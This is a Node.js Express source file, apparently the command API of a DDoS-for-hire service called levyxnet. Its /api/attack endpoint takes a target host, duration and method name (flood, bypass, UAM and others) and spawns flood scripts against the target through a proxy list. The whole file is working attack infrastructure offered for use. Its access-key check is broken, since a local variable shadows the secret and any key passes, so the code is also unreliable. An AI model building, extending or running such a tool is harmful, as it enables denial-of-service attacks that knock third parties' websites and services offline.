//METHODS 
//LEVYX-BYPASS LEVYX-UAM LEVYX-TLSX LEVYX-BROWSER LEVYX-SUPER LEVYX-SPAMMER LEVYX-PERFECT LEVYX-FLOOD LEVYX-GHOST LEVYX-TLS
const express = require('express');
const app = express();
const port = 8080;

const key = "@udpraw03";

app.get('/api/attack', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const port = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    if (method === 'LEVYX-TLS') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['TLS.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-GHOST') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['HTTPS-GHOST.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-FLOOD') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-PERFECT') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-SPAMMER') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-SUPER') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-BROWSER') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-TLSX') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'LEVYX-UAM') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'LEVYX-BYPASS') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['UAM.js', host, time, 8, 30, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else {
      console.error('Metode yang salah..');
      res.status(400).send('Metode yang salah..');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Ada masalah.');
  }
});

app.listen(port, () => {
  console.log(`API Levyxnet Started To: ${port} port`);
});
